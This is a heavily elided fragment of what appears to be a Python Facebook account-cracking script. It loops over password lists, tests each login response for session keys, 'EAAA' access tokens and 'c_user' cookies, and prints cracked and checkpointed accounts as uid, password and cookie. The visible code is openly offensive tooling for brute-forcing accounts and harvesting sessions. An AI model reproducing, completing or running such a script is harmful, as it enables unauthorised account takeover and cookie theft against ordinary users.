...
bulan = ["January", "February", "March", "April", "May", "Jun", "July", "August", "September", "October", "November", "December"]
	...
	try:
		...
		for pw in pwx:
			...
			if "session_key" in send.text and "EAAA" in send.text:
				...
				print("\r\033[0;95m[FLAME-CP] %s|%s\033[0;92m        "%(uid, pw))
		...
		try:
			...
			for pw in asu:
				...
				if "c_user" in ses.cookies.get_dict().keys():
					...
					print("\r\033[0;94m[MMU-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
					...
					print("\r\033[0;95m[MMU-CP] %s|%s\033[0;91m        "%(uid, pw))
